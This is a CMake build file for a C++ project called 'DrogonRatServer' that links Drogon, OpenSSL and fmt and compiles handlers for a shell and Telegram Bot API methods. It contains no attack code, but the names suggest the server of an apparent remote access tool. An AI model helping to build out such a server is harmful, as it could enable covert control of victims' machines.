cmake_minimum_required(VERSION 3.25)
project(DrogonRatServer LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)

# Enable ccache if available
find_program(CCACHE_PROGRAM ccache)
if(CCACHE_PROGRAM)
    message(STATUS "Found ccache: ${CCACHE_PROGRAM}")
    set(CMAKE_C_COMPILER_LAUNCHER ${CCACHE_PROGRAM})
    set(CMAKE_CXX_COMPILER_LAUNCHER ${CCACHE_PROGRAM})
endif()

if(DEBUG)
    add_compile_options(-g -O0 -Wall -Wextra -Werror)
    add_compile_definitions(DEBUG=1)
else()
    add_compile_options(-O2 -Wall -Wextra)
endif()

find_package(Drogon REQUIRED)
find_package(fmt REQUIRED)
find_package(OpenSSL REQUIRED)

include_directories(
    ${CMAKE_SOURCE_DIR}/include
    ${CMAKE_SOURCE_DIR}
)

set(SRCS
    src/Server/constructor.cpp
    src/Server/methods.cpp
    src/Handler/constructor.cpp
    src/Handler/Shell.cpp
    src/Handler/TelegramBotApiMethods/handleFileQueryById.cpp
    src/Handler/TelegramBotApiMethods/handleSendDocument.cpp
    src/Handler/TelegramBotApiMethods/handleSendMessage.cpp
    src/Handler/TelegramBotApiMethods/handleGetUpdate.cpp
    src/Handler/TelegramBotApiMethods.cpp
    src/Handler/methods.cpp
    src/main.cpp
)

include(cmake/pch.cmake)

add_executable(server ${SRCS})

target_link_libraries(server
    PRIVATE
        PCH
        Drogon::Drogon
        OpenSSL::SSL
        OpenSSL::Crypto
        fmt::fmt
)
include(cmake/Windows.cmake)
